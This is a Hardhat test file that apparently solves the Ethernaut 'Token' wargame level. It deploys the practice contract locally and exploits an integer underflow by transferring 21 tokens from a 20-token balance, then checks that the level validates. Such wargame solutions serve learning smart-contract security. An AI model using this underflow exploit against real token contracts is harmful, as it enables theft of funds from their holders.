import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";

const AMOUNT_TO_TRANSFER = "21";

describe("Token exploit", () => {
  async function deployTokenFixture() {
    const [deployer, attacker, toAddress] = await ethers.getSigners();
    const TokenFactory = await ethers.getContractFactory("TokenFactory");
    const tokenFactory = await TokenFactory.connect(deployer).deploy();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const tokenAddress = await tokenFactory.connect(attacker).callStatic.createInstance(attacker.address);

    const tx = await tokenFactory.connect(attacker).createInstance(attacker.address);
    await tx.wait();

    // Load the instance at returned address
    const token = await ethers.getContractAt("Token", tokenAddress);

    return { attacker, toAddress, token, tokenFactory };
  }

  it("Should get more tokens than specified", async () => {
    const { attacker, toAddress, token, tokenFactory } = await loadFixture(deployTokenFixture);

    // 20 - AMOUNT_TO_TRANSFER(21). This will underflow
    const tx = await token.connect(attacker).transfer(toAddress.address, AMOUNT_TO_TRANSFER);
    tx.wait();

    const balanceAfter = await token.balanceOf(attacker.address);
    console.log(" Attacker ------------------------------------------------------------- ", balanceAfter.toString());

    // Validate instance using Ethernaut validation
    // Simulate validateInstance to get return value
    const success = await tokenFactory.connect(attacker).callStatic.validateInstance(token.address, attacker.address);

    //const success = await tokenFactory.connect(attacker).validateInstance(token.address, attacker.address);

    expect(success).to.be.true;
  });
});
